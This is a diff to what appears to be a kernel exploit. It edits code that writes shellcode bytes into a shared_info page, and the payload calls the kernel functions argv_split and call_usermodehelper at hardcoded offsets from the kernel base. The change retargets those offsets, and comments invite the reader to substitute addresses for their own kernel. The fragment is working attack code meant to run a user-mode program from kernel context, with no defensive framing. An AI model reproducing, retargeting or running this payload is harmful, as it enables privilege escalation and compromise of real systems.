@@ -272,7 +272,7 @@ static inline void shared_info_write_page(char *base)
         *(base++) = 0x48;
         *(base++) = 0xc7;
         *(base++) = 0xc0;
-	*(u32*)base = (u32)(gilkup_vars.kernel_base + 0x3c5450); //TODO: replace with your argv_split
+	*(u32*)base = (u32)(gilkup_vars.kernel_base + 0x91ea70); //TODO: replace with your argv_split
 	base += sizeof(u32);
 
 	// call rax
@@ -298,7 +298,7 @@ static inline void shared_info_write_page(char *base)
         *(base++) = 0x48;
         *(base++) = 0xc7;
         *(base++) = 0xc0;
-        *(u32*)base = (u32)(gilkup_vars.kernel_base + 0x090b70); //TODO: replace with your call_usermodehelper
+        *(u32*)base = (u32)(gilkup_vars.kernel_base + 0x097830); //TODO: replace with your call_usermodehelper
         base += sizeof(u32);
 
 	// pop rax
